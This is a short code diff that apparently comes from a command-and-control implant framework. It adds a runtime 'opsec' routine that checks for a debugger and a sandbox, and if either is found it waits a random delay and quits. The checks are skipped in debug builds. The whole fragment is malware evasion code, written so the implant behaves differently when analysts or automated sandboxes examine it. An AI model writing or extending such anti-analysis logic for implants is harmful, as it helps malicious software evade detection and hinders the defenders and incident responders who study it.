@@ -1,6 +1,31 @@
 #include <core/include/opsec.hpp>
 namespace Opsec {
 
+    VOID RuntimeSecurityCheck() {
+
+        HEXANE
+        do {
+#ifndef DEBUG
+            Opsec::SeCheckDebugger();
+            if (ntstatus != ERROR_SUCCESS) {
+
+                Random::Timeout(SECONDS(8));
+                return_defer(ERROR_BAD_ENVIRONMENT);
+            }
+
+            Opsec::SeCheckSandbox();
+            if (ntstatus != ERROR_SUCCESS) {
+
+                Random::Timeout(SECONDS(8));
+                return_defer(ERROR_BAD_ENVIRONMENT);
+            }
+#endif
+            break;
+        } while (TRUE);
+
+        defer:
+    }
+
     BOOL CheckTime() {
         HEXANE
 
